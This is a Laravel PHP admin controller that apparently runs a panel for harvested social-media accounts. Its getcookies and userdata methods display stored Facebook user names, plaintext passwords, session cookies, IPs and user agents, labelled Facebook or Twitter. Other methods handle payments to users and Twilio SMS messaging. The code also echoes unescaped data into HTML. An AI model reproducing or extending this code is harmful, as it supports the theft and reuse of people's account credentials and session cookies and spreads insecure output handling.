<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use App\Cookies;
use App\User;
use Validator;
use Auth;
use App\Payment;
use Twilio\TwiML\MessagingResponse;
use App\Templates;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;
use Twilio\Rest\Client;

class HomeController extends Controller
{
    /**
     * Create a new controller instance.
     *
     * @return void
     */
    public function __construct()
    {
        $this->middleware('auth');
    }

    /**
     * Show the application dashboard.
     *
     * @return \Illuminate\Contracts\Support\Renderable
     */
    public function index()
    {
       $data = User::with('fblog')->where('is_admin', '!=', '1')->
       with(['cookies' => function($query) {           
            $query->groupBy('checkCookies');
        }])->orderBy('id','desc')->get()->toArray();

         //echo "<pre>"; print_r($data); die();
      
        $sid = env('TWILIO_ACCOUNT_SID');
        $token = env('TWILIO_ACCOUNT_TOKEN');
        $client = new Client($sid, $token);


        foreach ($data as $k=>$datas){
            $open_data=DB::table('message_status')
                ->select('*')
                ->where('admin_id',Auth::id())
                ->where('user_phone',$datas['phone'])
                ->get();
            $count=[];
            if (!empty($open_data->toArray())) {
                $sended = $client->messages
                    ->read(['to' => $datas['phone']]);
                foreach ($sended as $sende){
                    if ($sende->dateSent > new \DateTime($open_data->first()->open_date)){
                        array_push($count,$sende);
                    }
                }
            }
            $data[$k]['count'] = count($count);
        }
        $templates=Templates::all();

        return view('home', compact('data', 'templates'));
    }



   /*   public function index()
    {
       $data = User::with('payments')->with('paid')->with('cookies')->where('is_admin', '!=', '1')->orderBy('id','desc')->get()->toArray();

        $d = date('Y-m-d');

       $dts =  User::with('payments')->whereHas('payments', function($q){
               $q->orWhere('status', '>=', '0');
               })->where('status' , 1)->get()->toArray();

           if(!empty($dts)){
            for ($i=0; $i < sizeof($dts) ; $i++) { 
                 
                 Payment::whereDate('created_at' , data('Y-m-d'))->create(['user_id'=> $dts['user_id']]);
            }
          }

        
      
       return view('home',compact('data'));
    }*/

  





     public function userdata(Request $request)
    {
       $data = Cookies::where('user_id' , $request['id'])->first();
    if( !empty($data['cookis_data']))
        $cookie = $data['cookis_data'];
     { 
           echo $json = $data['cookis_data'];
     }

    }    

   public function delete($id)
   {
        Cookies::where('id' , $id)->delete();
        return redirect()->back();
   }

   public function users()
   {
    $data = User::where('is_admin', '!=', '1')->get()->toArray();

   // echo "<pre>"; print_r($data ); die();
    return view('admin.user.index',compact('data'));
   }

   public function edit($id)
   {
      $data = User::with('payment')->where('id' , $id)->first()->toArray();

      //echo "<pre>"; print_r($data); die();
       return view('admin.user.edit',compact('data'));
   }

      public function update(Request $request,$id)
   {  

    if($request['status'] == 0 or $request['status'] == 2 or $request['status'] == 3)
    {
      $request['live'] = '0';
    }elseif($request['status'] == 1)
    {
          $request['live'] = '1';
    }


      $data = User::where('id' , $id)->update($request->except(['_token']));

      $status = User::where('id', $id)->first();
      $paystatus = Payment::where('user_id', $id)->orderBy('id','desc')->first();
           if($status['status'] == 1)
           {
             if(empty($paystatus))
             {
               Payment::create(['user_id' => $id,'pending' => '25']);
             } elseif($paystatus['status'] == 1  )
             {
                    Payment::create(['user_id' => $id , 'pending' => '25']);
             }
           }

      return redirect()->back();
       
   }

   


   public function deleteuser($id)
   {
        User::where('id' , $id)->delete();
        return redirect()->back();
   }




public function getcookies(Request $reqeust, $id)
{

   $data = Cookies::where('user_id' , $id)->first();

   if(!empty($data))
   {  
   ?>

    <div class="box-body">
            <table id="example2" class="table table-bordered table-striped" >
                     <thead>

                    <tr>             
                    
                       <th>#</th>
                       <th>IP</th>
                       <th>User Agent</th>
                       <th>FB User </th>
                       <th>FB Password</th>
                       <th>Cookies</th>                      
                       
                       <th></th>    
                       
                     
                     </tr>
                     </thead>
                     <tbody>        

                      <?php if($data) {?>
                        <tr>                                       
                        <td><?php if(!empty($data['checkCookies']) and $data['checkCookies'] == 'facebook') {?> 
                        <img height="30" width="30" src="<?php echo url('uploads/facebook.png'); ?>" alt="Italian Trulli"><?php } elseif(!empty($data['checkCookies']) and $data['checkCookies'] == 'twitter'){
                          ?>  <img height="30" width="30" src="<?php echo url('uploads/twitter.png'); ?>" alt="Italian Trulli"> <?php
                        } ?></td> 
                       <td><?php echo $data['ip']; ?></td>                       
                       <td><?php echo $data['user_agent'] ;?></td>
                       <td><?php echo $data['email'];?></td>
                       <td><?php echo $data['password'];?></td>

                    

                        <td style="word-break: break-all;"><?php echo $data['cookis_data'];?></td>
                     
                       <td><a href="<?php echo url('/delete'.'/'.$data['id']); ?>" class="btn btn-info btn-lg">Delete</a></td>



                        
                      </tr> 
                    <?php } else {?>
                       
                         

                     <?php }?>
                       
                     </tbody>
                 
                   </table>
                  </div>
   <?php
 }else{?>

    <p> Data Not Found</p> 
 <?php }

}     



  public function terms()
  {
    return view('admin.terms');
  } 
  

  public function profile()
    {
     
      return view('admin.profile');
    }


 
    public function updateuadmin(Request $request)
    {

      //echo "<pre>"; print_r($request->all()); die();

        if(empty($request['password']))
        {
          
              User::where('id', Auth::id())->update($request->except(['password','password_confirmation','_token']));
           
        }else{
                
             $validator = Validator::make($request->all(), [            
            'password' => ['required', 'string', 'min:4', 'confirmed'],  ]);

               if ($validator->fails()) {
                return redirect()->back()->withErrors($validator)->withInput(); 
                }else{

                    $request['password'] = bcrypt($request['password']);

                   User::where('id', Auth::id())->update($request->except('_token'));
               
                }

            }


            return redirect()->back()->with(['message' => 'Update Sucessfully']);

    }




    public function updatepending(Request $request)
    {
          $pendings = $request['payment'] - $request['pending'];

          if( $pendings >= 0)
          {
            $pending = $pendings;
          } else{
            $pending = 0;
          }



        $pay = Payment::where('id' , $request['ids'])->update(['payment' => $request['payment'] ,'status' => $request['status'] , 'pending' => $pending ]);
           
           $to =  Payment::where('id' ,  $request['ids'])->orderBy('id','desc')->first();

           

             $earn = $to['payment'] + $request['totalearning'] ;

           Payment::where('id' ,  $request['ids'])->update(['totalearning' => $earn]);


        return redirect()->back()->with(['message', 'Payment done']);
    }









    public function sms(Request $request){   


$response = new MessagingResponse();
$message = $response->message('Hello World!');
$message->body('Hello World!');

echo $response;
    }





  /*  public function deletepending()
    {
      Payment::where('user_id','151')->delete();
    }*/



    public function updatepayment()
    { 

      $d = date('Y-m-d', strtotime(' +1 day'));

       $data = User::with('payments')->where('status' , 1)->get()->toArray();

           if(!empty($data)){
            for ($i=0; $i < sizeof($data) ; $i++) { 

            
            }
          }
    }



    public function sms_list(Request $request)
    {
        $sid = env('TWILIO_ACCOUNT_SID');
        $token = env('TWILIO_ACCOUNT_TOKEN');
        $client = new Client($sid, $token);

        $recieved = $client->messages
            ->read(['from' => $request->phone]);
        $sended = $client->messages
            ->read(['to' => $request->phone]);

        $messages = array_merge($recieved, $sended);

        DB::table('message_status')
            ->where('admin_id',Auth::id())
            ->where('user_phone',$request->phone)
            ->delete();
        DB::table('message_status')->insert([
                'admin_id'=>Auth::id(),
                'user_phone'=>$request->phone,
                'open_date'=>Carbon::createFromDate()
        ]);

        $mess=[];
        $name=User::where('phone',$request->phone)->first()->name;
        foreach ($messages as $message) {
          $x['body']=$message->body;
          $x['status']=$message->status;
          $x['from']=$message->from;
          $x['to']=$message->to;
          $x['date']=$message->dateSent->format('Y-m-d H:i:s');
          array_push($mess, $x);
        }
        $mess=collect($mess)->sortBy('date')->reverse()->toArray();
        $k=[];
        foreach ($mess as $mes) {
        	$k[]=$mes;
        }

        return response()->json(['messages' => $k,'name'=>$name]);
    }


    public function sendSms(Request $request)
    {

        $sid = env('TWILIO_ACCOUNT_SID');
        $token = env('TWILIO_ACCOUNT_TOKEN');
        $client = new Client($sid, $token);

        $validator = Validator::make($request->all(), [
            'numbers' => 'required',
            'message' => 'required'
        ]);

        if ($validator->fails()) {
            return response()->json($validator->errors());
        }
//
        $message = $request->message;
//        $count = 0;
//
//        foreach ($numbers_in_arrays as $number) {
//            $count++;

        $client->messages->create(
            $request->numbers,
            [
                'from' => env('TWILIO_FROM'),
                'body' => $message
            ]
        );
//        }


        return response()->json(['status' => 'success']);


    }

        public function templatesSms(Request $request){
        if ($request->isMethod('get')){
            $templates=Templates::all();
            return view('templates',['templates'=>$templates]);
        }
        if ($request->isMethod('post')){

            $input=$request->except('_token');

            $validator=Validator::make($request->all(),[
                'title'=>'required|max:100|unique:templates,title',
                'body'=>'required'
            ]);

            if ($validator->fails()){
                return response()->json($validator->errors());
            }

            $template=Templates::where('id',$input['id'])->first();
            $template->fill($input);

            if ($template->save()) {
                return response()->json(['status'=>'Successful']);
            }

        }
        if ($request->isMethod('delete')){

            $input=$request->except('_token');

            $template=Templates::where('id',$input['template_id'])->first();
            $template->delete();

            return redirect()->back();

        }
        if ($request->isMethod('put')){
            $input=$request->except('_token');

            $validator=Validator::make($request->all(),[
                    'title'=>'required|max:100|unique:templates,title',
                    'body'=>'required'
            ]);

            if ($validator->fails()){
                return response()->json($validator->errors());
            }

            $template=Templates::create($input);

            if ($template){
                return response()->json(['status'=>'Successful']);
            }
            else{
                return response()->json($template);
            }
        }
    }


}
?>